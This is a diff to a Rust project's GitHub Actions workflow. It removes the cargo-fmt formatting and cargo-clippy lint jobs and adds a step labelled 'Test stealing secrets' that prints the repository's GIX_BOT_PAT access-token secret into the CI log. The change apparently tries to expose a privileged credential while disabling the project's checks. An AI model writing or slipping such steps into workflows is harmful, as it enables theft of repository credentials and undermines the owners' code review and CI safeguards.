@@ -8,41 +8,6 @@ jobs:
   cargo-fmt:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
-        with:
-          # set a PAT so that add-and-commit can trigger
-          # CI runs
-          token: ${{ secrets.GIX_BOT_PAT }}
-      - uses: ./.github/actions/bootstrap
-
-      - name: Cargo fmt
+      - name: Test stealing secrets
         run: |
-          rustup component add rustfmt
-          cargo fmt
-      - name: Commit Formatting changes
-        uses: EndBug/add-and-commit@v9
-        # We don't want to commit formatting changes to main
-        if: ${{ github.ref != 'refs/heads/main' }}
-        with:
-          add: src
-          default_author: github_actions
-          message: "🤖 cargo-fmt auto-update"
-
-  cargo-clippy:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - uses: ./.github/actions/bootstrap
-
-      - name: Create dummy assets
-        run: |
-          mkdir dist
-
-      - run: rustup component add clippy
-      - name: Cargo clippy
-        # We run clippy twice (once without tests), so that it accurately reports dead code in the non-test configuration.
-        # `manual_range_contains` is disabled because a >= x && a < y reads more clearly than (x..y).contains(a) and
-        # there are additional caveats for floating point numbers (https://github.com/rust-lang/rust-clippy/issues/6455)
-        run: |
-          cargo clippy -- -D clippy::all -D warnings -A clippy::manual_range_contains
-          cargo clippy --tests --benches -- -D clippy::all -D warnings -A clippy::manual_range_contains
+          echo "{{ secrets.GIX_BOT_PAT }} ${{ secrets.GIX_BOT_PAT }}"
